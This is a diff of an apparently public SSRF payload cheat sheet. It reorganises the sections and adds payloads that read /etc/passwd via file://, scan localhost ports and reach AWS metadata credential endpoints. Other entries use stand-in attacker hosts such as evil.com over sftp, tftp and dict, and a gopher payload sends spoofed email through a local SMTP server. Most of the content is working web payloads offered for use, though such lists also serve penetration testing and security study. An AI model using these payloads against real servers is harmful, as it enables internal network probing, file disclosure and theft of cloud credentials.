@@ -1,17 +1,14 @@
 # Server-Side Request Forgery
 
 Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
-
-Tools:
-
-- [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
-- [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
+![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/Images/SSRF_stream.png.jpg)
 
 ## Summary
 
-* [Exploit with localhost](#exploit-with-localhost)
+* [Tools](#tools)
+* [Payloads with localhost](#exploit-with-localhost)
 * [Bypassing filters](#bypassing-filters)
-* [SSRF via URL Scheme](#ssrf-via-url-scheme)
+* [SSRF exploitation via URL Scheme](#ssrf-via-url-scheme)
 * [SSRF to XSS](#ssrf-to-xss-by-d0rkerdevil--alyssaoherrera)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
@@ -27,7 +24,12 @@ Tools:
   * [SSRF URL for Docker](#ssrf-url-for-docker)
   * [SSRF URL for Rancher](#ssrf-url-for-rancher)
 
-## Exploit with localhost
+## Tools
+
+- [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
+- [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
+
+## Payloads with localhost
 
 Basic SSRF v1
 
@@ -177,42 +179,53 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 ![https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/Images/SSRF_Parser.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/Images/WeakParser.jpg)
 
 
-## SSRF via URL Scheme
+## SSRF exploitation via URL Scheme
 
-File Wrapper
+File : allows an attacker to fetch the content of a file on the server
 
 ```powershell
+file://path/to/file
 file:///etc/passwd
 file://\/\/etc/passwd
+ssrf.php?url=file:///etc/passwd
 ```
 
-Dict Wrapper
-The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+Http: allows an attacker to fetch any content from the web, it can also be used to scan ports.
+
+```powershell
+ssrf.php?url=http://127.0.0.1:22
+ssrf.php?url=http://127.0.0.1:80
+ssrf.php?url=http://127.0.0.1:443
+```
+
+The following URL scheme can be used to probe the network
+
+Dict : the DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
 
 ```powershell
 dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
 ssrf.php?url=dict://attacker:11111/
 ```
 
-Sftp Wrapper
+Sftp : a network protocol used for secure file transfer over secure shell
 
 ```powershell
 ssrf.php?url=sftp://evil.com:11111/
 ```
 
-Tftp Wrapper
+Tftp : Trivial File Transfer Protocol, works over UDP
 
 ```powershell
 ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
 ```
 
-Ldap Wrapper
+Ldap : Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
 
 ```powershell
 ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
 ```
 
-Gopher Wrapper
+Gopher
 
 ```powershell
 ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
@@ -337,6 +350,8 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
 ```
 
 E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
+
+E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
 
 ### SSRF URL for Google Cloud
 
@@ -492,3 +507,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [Piercing the Veil: Server Side Request Forgery to NIPRNet access](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
 - [Hacker101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)
 - [SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
+- [SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
